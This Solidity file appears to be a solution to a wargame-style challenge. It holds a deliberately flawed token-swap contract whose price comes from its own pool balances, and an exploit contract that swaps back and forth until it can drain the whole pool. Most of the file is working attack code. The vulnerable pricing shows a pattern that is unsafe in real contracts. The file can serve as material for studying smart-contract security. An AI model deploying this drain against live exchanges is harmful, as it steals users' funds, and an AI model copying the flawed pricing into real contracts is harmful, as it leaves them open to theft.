// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "hardhat/console.sol";

contract Dex {
    using SafeMath for uint256;
    address public token1;
    address public token2;

    constructor(address _token1, address _token2) public {
        token1 = _token1;
        token2 = _token2;
    }

    function swap(
        address from,
        address to,
        uint256 amount
    ) public {
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        uint256 swap_amount = get_swap_price(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swap_amount);
        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
    }

    function add_liquidity(address token_address, uint256 amount) public {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function get_swap_price(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(spender, amount);
        SwappableToken(token2).approve(spender, amount);
    }

    function balanceOf(address token, address account)
        public
        view
        returns (uint256)
    {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract DexOneExploit {
    Dex public dex;
    using SafeMath for uint256;

    constructor(address _dex) {
        dex = Dex(_dex);
        dex.approve(address(dex), type(uint256).max);
    }

    function exploit() public {
        ERC20 token1 = ERC20(dex.token1());
        ERC20 token2 = ERC20(dex.token2());
        token1.transferFrom(
            msg.sender,
            address(this),
            dex.balanceOf(dex.token1(), msg.sender)
        );

        token2.transferFrom(
            msg.sender,
            address(this),
            dex.balanceOf(dex.token2(), msg.sender)
        );
        
        // swap back and forth until one token become 0. Or 1 token we have more than half supply.
        while (true) {
            if (isLiquidZero()) break;
            if (isOwnMoreThanHalfTotalSupplyOfOneToken()) break;
            if (dex.balanceOf(dex.token1(), address(this)) > 0) {
                // console.log("swap1");
                swap(token1, token2);
            } else if (dex.balanceOf(dex.token2(), address(this)) > 0) {
                // console.log("swap2");
                swap(token2, token1);
            } else revert("No tokens");
        }
        // final swap. we swap ~55 for all 110 token inside dex.
        // console.log("final swap");
        finalSwap();
        // console.log("dex token1 balance", dex.balanceOf(dex.token1(), address(dex)));
        // console.log("dex token2 balance", dex.balanceOf(dex.token2(), address(dex)));
    }

    // swap using math. Swap till we reach over half total supply of token. That's when we know we can withdraw all tokens.
    // As dex liquid is not enough to cover swap price
    function swap(ERC20 token1, ERC20 token2) public {
        uint256 token1Balance = token1.balanceOf(address(this));
        // console.log("swap amount", token1Balance);
        dex.swap(address(token1), address(token2), token1Balance);
    }

    // no liquid mean swap price zero or infinite
    function isLiquidZero() public view returns (bool) {
        if (dex.balanceOf(dex.token1(), address(dex)) == 0) return true;
        if (dex.balanceOf(dex.token2(), address(dex)) == 0) return true;
        return false;
    }

    // follow the formula (t1s * x) / (t2s - x) . Where x is the swap token1 amount.
    function isOwnMoreThanHalfTotalSupplyOfOneToken()
        public
        view
        returns (bool)
    {
        uint256 user1balance = dex.balanceOf(dex.token1(), address(this));
        uint256 user2balance = dex.balanceOf(dex.token2(), address(this));
        uint dex1balance = dex.balanceOf(dex.token1(), address(dex));
        uint dex2balance = dex.balanceOf(dex.token2(), address(dex));
        uint256 t1s = user1balance + dex1balance;
        uint256 t2s = user2balance + dex2balance;
        // console.log("user1balance", user1balance);
        // console.log("user2balance", user2balance);
        // console.log("dex1balance", dex1balance);
        // console.log("dex2balance", dex2balance);
        if (user1balance >= t1s / 2) return true;
        if (user2balance >= t2s / 2) return true;
        return false;
    }

    function finalSwap() public {
        uint256 user1balance = dex.balanceOf(dex.token1(), address(this));
        uint256 user2balance = dex.balanceOf(dex.token2(), address(this));
        uint256 d1b = dex.balanceOf(dex.token1(), address(dex));
        uint256 d2b = dex.balanceOf(dex.token2(), address(dex));
        uint256 t1s = user1balance + d1b;
        uint256 t2s = user2balance + d2b;

        require(
            user1balance >= t1s / 2 || user2balance >= t2s / 2,
            "Not enough tokens"
        );

        if (user1balance >= t1s / 2) {
            uint256 swapAmount = d1b;
            // console.log("swap token1 for all token 2", swapAmount);
            dex.swap(dex.token1(), dex.token2(), swapAmount);
        } else {
            uint256 swapAmount = d2b;
            // console.log("swap token2 for all token1", swapAmount);
            dex.swap(dex.token2(), dex.token1(), swapAmount);
        }
    }
}
